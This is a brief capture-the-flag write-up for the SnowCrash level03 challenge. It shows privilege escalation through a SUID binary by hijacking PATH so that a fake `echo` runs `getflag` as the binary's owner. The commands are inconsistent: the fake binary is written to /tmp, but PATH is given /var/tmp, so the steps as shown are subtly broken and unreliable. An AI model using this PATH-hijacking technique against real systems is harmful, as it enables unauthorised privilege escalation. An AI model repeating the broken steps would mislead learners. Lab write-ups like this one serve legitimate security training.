```bash
ls -la
```

We can see that level03 has the SUID flag in the file permissions.

The SUID flag allows the file to be executed with the privileges of the file's owner, even if another user runs it.

Running level03 give a simple string 'Exploit me'

Searching 'Exploit me'
```bash
level03@SnowCrash:~$ strings ./level03 | grep 'Exploit me'
/usr/bin/env echo Exploit me
```


This means the program is using a system call to invoke `echo` with 'Exploit me' as an argument. Since the owner of the program is flag03, and the level03 user can execute the program with flag03's privileges, we can easily change the behavior of echo by modifying the PATH environment variable to exploit the program.

Create a fake echo command that uses `getflag`
```bash
echo "getflag" > /tmp/echo
chmod +x /tmp/echo
```

Change PATH environment variable.

```bash
PATH="/var/tmp:$PATH"
```

Calling `./level03` we can get the flag for the next level.
